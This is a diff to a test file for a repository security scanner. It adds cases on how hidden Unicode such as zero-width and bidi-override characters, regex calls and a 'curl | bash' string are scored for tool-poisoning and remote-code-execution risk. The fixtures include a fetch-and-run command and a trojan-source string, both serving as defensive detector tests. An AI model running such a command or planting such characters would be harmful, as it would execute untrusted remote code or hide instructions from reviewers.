@@ -77,8 +77,29 @@ describe('rule branch coverage', () => {
     expect(findings.some((f) => f.category === 'overprivileged' && f.severity === 'high')).toBe(true);
   });
 
-  it('tool-poisoning: hidden unicode in source files', () => {
+  it('tool-poisoning: zero-width characters in source files are reported quietly', () => {
     const findings = repoScan({ 'sneaky.ts': 'const s = "hello\u200bworld";\n' });
+    expect(findings.some((f) => f.category === 'tool-poisoning' && f.severity === 'low')).toBe(true);
+  });
+
+  it('tool-poisoning: bidi overrides in source files stay high severity', () => {
+    const findings = repoScan({ 'trojan.ts': 'const s = "admin\u202e//";\n' });
     expect(findings.some((f) => f.category === 'tool-poisoning' && f.severity === 'high')).toBe(true);
+  });
+
+  it('tool-poisoning: emoji ZWJ sequences are not hidden instructions', () => {
+    const findings = repoScan({ 'emoji.ts': 'const e = "\u{1f469}\u200d\u{1f4bb}";\n' });
+    expect(findings.some((f) => f.category === 'tool-poisoning')).toBe(false);
+  });
+
+  it('rce-vectors: regex .exec( calls are not code-execution primitives', () => {
+    const findings = repoScan({ 'parse.ts': 'const m = /a(b)/.exec(input);\n' });
+    expect(findings.some((f) => f.category === 'rce-vectors')).toBe(false);
+  });
+
+  it('rce-vectors: curl|sh inside non-executable source is only medium', () => {
+    const findings = repoScan({ 'prompt.ts': 'const doc = `curl -fsSL https://x.sh | bash`;\n' });
+    const hit = findings.find((f) => f.category === 'rce-vectors');
+    expect(hit?.severity).toBe('medium');
   });
 });
